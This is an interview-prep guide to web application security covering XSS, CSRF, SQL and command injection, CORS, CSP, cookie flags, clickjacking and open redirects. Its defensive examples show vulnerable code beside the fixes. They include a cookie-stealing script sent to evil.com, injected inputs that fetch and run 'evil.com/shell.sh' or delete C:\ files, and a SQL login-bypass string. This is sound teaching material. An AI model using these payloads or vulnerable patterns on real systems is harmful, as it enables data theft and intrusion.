# Web Application Security

## Questions Covered

1. What are the types of XSS and how do you prevent them?
2. What is CSRF and how do anti-forgery tokens work?
3. What is SQL injection and how do you prevent it?
4. What is command injection and how do you mitigate it?
5. What is CORS for, and what are common misconfigurations?
6. How does Content-Security-Policy (CSP) protect web applications?
7. What secure cookie flags should you set and why?
8. What is clickjacking and how do X-Frame-Options and frame-ancestors help?
9. What are open redirect vulnerabilities and how do you fix them?
10. What is a practical security headers checklist for production?

## What are the types of XSS and how do you prevent them?

**XSS** injects script that runs in another user's browser in your origin — stealing cookies, performing actions, or defacing pages. Defense: **context-aware output encoding**, **input validation**, **CSP**, **HttpOnly cookies**, and safe DOM APIs.

| Type | Payload location | Vector |
|------|------------------|--------|
| **Stored** | DB/CMS | Malicious post viewed by all |
| **Reflected** | Echoed in response | Crafted URL / phishing |
| **DOM-based** | Client only | `innerHTML`, `location.hash` |

```html
<!-- Attacker posts comment -->
<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
```

```http
GET /search?q=<script>alert(document.domain)</script> HTTP/1.1
Host: shop.example.com
```

```javascript
// Vulnerable server-side template
res.send(`<h1>Results for: ${req.query.q}</h1>`);

// Vulnerable — hash written to DOM without sanitization
document.getElementById('banner').innerHTML = decodeURIComponent(location.hash.slice(1));
```

```csharp
// Razor auto-encodes by default
<p>Hello @Model.UserName</p>

// Explicit encoding when building HTML manually
var safe = HtmlEncoder.Default.Encode(userInput);

// Startup — baseline CSP
app.Use(async (context, next) =>
{
    context.Response.Headers["Content-Security-Policy"] =
        "default-src 'self'; script-src 'self' 'nonce-{nonce}'; object-src 'none'; base-uri 'self'";
    await next();
});
```

```javascript
// Safe — textContent does not parse HTML
element.textContent = userInput;

// Dangerous without sanitization
element.innerHTML = userInput;

// If HTML is required, use a vetted sanitizer
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput, { ALLOWED_TAGS: ['b', 'i', 'p'] });
```

**Interview:** Three types (stored/reflected/DOM); layered defense = encode + validate + CSP + HttpOnly.

## What is CSRF and how do anti-forgery tokens work?

**CSRF** tricks a logged-in browser into sending an authenticated request the user did not intend. Cookies attach automatically; the server needs proof the request originated from your app.

```html
<!-- evil.com page while victim is logged into bank.example.com -->
<img src="https://bank.example.com/transfer?to=attacker&amount=1000" />
```

**Synchronizer token pattern:** random token bound to session → embedded in form/header → validated on state-changing requests. SameSite cookies and custom headers add defense.

```csharp
// Program.cs
builder.Services.AddAntiforgery(options =>
{
    options.HeaderName = "X-CSRF-TOKEN";
    options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
    options.Cookie.HttpOnly = true;
});

// Controller
[ValidateAntiForgeryToken]
[HttpPost]
public IActionResult UpdateProfile(ProfileDto dto) => Ok();

// Razor form — tag helper injects token automatically
// <form asp-action="UpdateProfile" method="post">...</form>
```

```javascript
// SPA — read token from cookie/meta and send header
const token = document.querySelector('meta[name="csrf-token"]').content;
await fetch('/api/profile', {
  method: 'POST',
  headers: { 'X-CSRF-TOKEN': token, 'Content-Type': 'application/json' },
  credentials: 'include',
  body: JSON.stringify(dto)
});
```

| Defense | Mechanism |
|---------|-----------|
| SameSite cookies | Blocks cross-site cookie on most requests |
| Custom headers | Simple CORS requests cannot set arbitrary headers |
| Re-authentication | Password/MFA for sensitive actions |

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/
```

**Interview:** Tokens on POST/PUT/DELETE + SameSite + custom headers for APIs.

## What is SQL injection and how do you prevent it?

**SQL injection** concatenates user input into queries, altering logic — bypassing login, reading rows, or destructive statements.

```csharp
// VULNERABLE — string concatenation
var sql = $"SELECT * FROM Users WHERE Email = '{email}' AND Password = '{password}'";
// Input: ' OR '1'='1' -- bypasses login

// SAFE — parameterized query (ADO.NET)
var cmd = new SqlCommand("SELECT * FROM Users WHERE Email = @email", connection);
cmd.Parameters.AddWithValue("@email", email);

// SAFE — Entity Framework Core (parameterized under the hood)
var user = await _db.Users.FirstOrDefaultAsync(u => u.Email == email);
```

```javascript
// Node.js — always use placeholders
const result = await pool.query(
  'SELECT * FROM orders WHERE customer_id = $1 AND status = $2',
  [customerId, status]
);
```

Prevention: parameterized queries, ORM, least-privilege DB, allowlists, WAF monitoring.

**Interview:** Parameters at every DB boundary.

## What is command injection and how do you mitigate it?

**Command injection** passes untrusted input to OS shells (`exec`, `Process.Start`), enabling arbitrary server commands.

```csharp
// VULNERABLE — user controls filename passed to shell
var psi = new ProcessStartInfo("cmd.exe", $"/c convert {userFileName} output.pdf");
Process.Start(psi);
// Input: report.pdf & del /f /q C:\*.*
```

```javascript
// VULNERABLE
const { exec } = require('child_process');
exec(`ffmpeg -i ${userPath} out.mp4`, callback);
// Input: x.mp4; curl evil.com/shell.sh | sh
```

Mitigation: avoid shells (use libraries), allowlist arguments, `ArgumentList` arrays, path canonicalization, sandboxed containers.

```csharp
var allowedFormats = new HashSet<string> { "pdf", "png", "jpg" };
if (!allowedFormats.Contains(format)) throw new ArgumentException("Invalid format");

var safeInput = Path.GetFullPath(Path.Combine(uploadDir, Path.GetFileName(userFileName)));
if (!safeInput.StartsWith(uploadDir)) throw new SecurityException("Path traversal");

var psi = new ProcessStartInfo
{
    FileName = @"C:\tools\convert.exe",
    RedirectStandardOutput = true,
    UseShellExecute = false
};
psi.ArgumentList.Add(safeInput);
psi.ArgumentList.Add("output.pdf");
Process.Start(psi);
```

```yaml
# Container — drop capabilities, read-only root
securityContext:
  readOnlyRootFilesystem: true
  allowPrivilegeEscalation: false
  runAsNonRoot: true
```

**Interview:** Never pass user input to a shell; use libraries + argument arrays + isolation.

## What is CORS for, and what are common misconfigurations?

**CORS** is browser policy — servers declare which cross-origin scripts may **read** responses. Not server-side access control; curl bypasses CORS.

```http
# Preflight (browser sends OPTIONS first for non-simple requests)
OPTIONS /api/orders HTTP/1.1
Origin: https://app.example.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Authorization, Content-Type

HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, PUT
Access-Control-Allow-Headers: Authorization, Content-Type
Access-Control-Max-Age: 600
```

```http
# Actual request
PUT /api/orders/42 HTTP/1.1
Origin: https://app.example.com
Authorization: Bearer eyJ...

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Credentials: true
```

```csharp
builder.Services.AddCors(options =>
{
    options.AddPolicy("Production", policy =>
        policy.WithOrigins("https://app.example.com", "https://admin.example.com")
              .WithMethods("GET", "POST", "PUT", "DELETE")
              .WithHeaders("Authorization", "Content-Type", "X-CSRF-TOKEN")
              .AllowCredentials());
});

app.UseCors("Production");
```

| Misconfig | Risk |
|-----------|------|
| `*` + credentials | Invalid or mis-implemented |
| Reflecting arbitrary `Origin` | Any site reads authenticated responses |
| CORS as sole auth | Attackers use curl/server-side |

**Interview:** Explicit origin allowlist; auth server-side always.

## How does Content-Security-Policy (CSP) protect web applications?

**CSP** allowlists which scripts, styles, images, frames, and connections may load — strong XSS defense even if injection occurs.

| Directive | Purpose |
|-----------|---------|
| `script-src` | JS sources |
| `connect-src` | fetch/XHR/WebSocket |
| `frame-ancestors` | Clickjacking |
| `object-src` | Usually `'none'` |

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-abc123' https://cdn.trusted.com;
  style-src 'self' 'nonce-abc123';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'self';
  object-src 'none';
  upgrade-insecure-requests;
```

```csharp
// Middleware generates per-request nonce
var nonce = Convert.ToBase64String(RandomNumberGenerator.GetBytes(16));
context.Items["csp-nonce"] = nonce;
context.Response.Headers["Content-Security-Policy"] =
    $"script-src 'self' 'nonce-{nonce}'; object-src 'none'; base-uri 'self'";

// Razor
<script nonce="@Context.Items["csp-nonce"]">initApp();</script>
```

```javascript
// Without nonce, inline script blocked by strict CSP
// External scripts must be on allowlisted domains
<script src="https://cdn.trusted.com/app.js"></script>
```

Roll out via Report-Only first; avoid `unsafe-inline`/`unsafe-eval`.

## What secure cookie flags should you set and why?

Session cookies need flags that resist XSS theft and cross-site abuse.

| Flag | Purpose |
|------|---------|
| HttpOnly | JS cannot read — mitigates XSS session theft |
| Secure | HTTPS only |
| SameSite | `Strict`/`Lax`/`None` (None requires Secure) |
| `__Host-` prefix | Secure + Path=/ + no Domain |

```http
Set-Cookie: __Host-session=eyJhbGciOiJIUzI1NiJ9...;
  Path=/;
  Secure;
  HttpOnly;
  SameSite=Lax;
  Max-Age=3600
```

```csharp
builder.Services.Configure<CookieAuthenticationOptions>(
    CookieAuthenticationDefaults.AuthenticationScheme, options =>
{
    options.Cookie.Name = "__Host-session";
    options.Cookie.HttpOnly = true;
    options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
    options.Cookie.SameSite = SameSiteMode.Lax;
    options.ExpireTimeSpan = TimeSpan.FromHours(1);
    options.SlidingExpiration = true;
});
```

```javascript
// document.cookie CANNOT read HttpOnly cookies — good
// Never store JWT in localStorage if XSS is a concern; HttpOnly cookie + CSRF token is safer for SPAs
```

**Interview:** HttpOnly + Secure + SameSite always; `__Host-` for sessions; short lifetimes for sensitive apps.

## What is clickjacking and how do X-Frame-Options and frame-ancestors help?

**Clickjacking** embeds your site in a transparent iframe; users click attacker's UI but hit your hidden buttons.

```html
<!-- evil.com -->
<style>iframe { opacity: 0.0001; position: absolute; top: 0; left: 0; width: 100%; height: 100%; }</style>
<button>Click to win a prize!</button>
<iframe src="https://bank.example.com/transfer?confirm=1"></iframe>
```

Block framing with CSP `frame-ancestors 'none'` (preferred) or `X-Frame-Options: DENY`.

```http
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none';
Content-Security-Policy: frame-ancestors 'self' https://partner.example.com;
```

```csharp
app.Use(async (context, next) =>
{
    context.Response.Headers["X-Frame-Options"] = "DENY";
    context.Response.Headers["Content-Security-Policy"] =
        "frame-ancestors 'none'; default-src 'self'";
    await next();
});
```

**Interview:** `frame-ancestors 'none'` in CSP (preferred) or `X-Frame-Options: DENY` for legacy.

## What are open redirect vulnerabilities and how do you fix them?

**Open redirect** sends users to attacker-controlled URLs via `returnUrl`/`redirect` params, abusing trust in your domain.

```csharp
// VULNERABLE
public IActionResult Login(string returnUrl)
{
    if (User.Identity.IsAuthenticated)
        return Redirect(returnUrl); // attacker sets returnUrl=https://evil.com
    return View();
}
```

```javascript
// VULNERABLE
const next = new URLSearchParams(location.search).get('next');
window.location.href = next;
```

Fix: allowlist relative paths, server-side destination maps, OAuth-style registered redirect URIs.

```csharp
private bool IsLocalUrl(string url)
{
    return !string.IsNullOrEmpty(url)
        && url[0] == '/'
        && (url.Length == 1 || (url[1] != '/' && url[1] != '\\'))
        && !url.StartsWith("/\\");
}

public IActionResult Login(string returnUrl)
{
    if (User.Identity.IsAuthenticated)
    {
        if (!IsLocalUrl(returnUrl))
            returnUrl = "/";
        return LocalRedirect(returnUrl);
    }
    return View();
}
```

```javascript
function safeRedirect(path) {
  try {
    const url = new URL(path, window.location.origin);
    if (url.origin !== window.location.origin) return '/';
    return url.pathname + url.search;
  } catch {
    return '/';
  }
}
```

**Interview:** Never redirect to raw user URLs; validate relative paths or use registered URI lists.

## What is a practical security headers checklist for production?

| Header | Value | Protects |
|--------|-------|----------|
| HSTS | `max-age=31536000; includeSubDomains` | Downgrade attacks |
| CSP | Strict `default-src 'self'` + nonces | XSS |
| X-Content-Type-Options | `nosniff` | MIME sniffing |
| X-Frame-Options / frame-ancestors | `DENY` | Clickjacking |
| Referrer-Policy | `strict-origin-when-cross-origin` | URL leakage |
| Permissions-Policy | `camera=(), microphone=()` | Feature abuse |
| COOP/CORP | `same-origin` | Cross-origin isolation |

```http
HTTP/1.1 200 OK
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-r4nd0m'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
Set-Cookie: __Host-session=...; Path=/; Secure; HttpOnly; SameSite=Lax
```

```csharp
app.Use(async (context, next) =>
{
    var headers = context.Response.Headers;
    headers["X-Content-Type-Options"] = "nosniff";
    headers["X-Frame-Options"] = "DENY";
    headers["Referrer-Policy"] = "strict-origin-when-cross-origin";
    headers["Permissions-Policy"] = "camera=(), microphone=(), geolocation=()";
    headers["Cross-Origin-Opener-Policy"] = "same-origin";
    await next();
});

if (!app.Environment.IsDevelopment())
    app.UseHsts(); // adds Strict-Transport-Security
```

```yaml
# nginx reverse proxy
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-Frame-Options "DENY" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
```

Verify with securityheaders.com or `curl -I`; roll out CSP via Report-Only first.

---

## Related Topics

- **API Security** (`Security/`)
- **React Error Handling and Security** (`React/`)
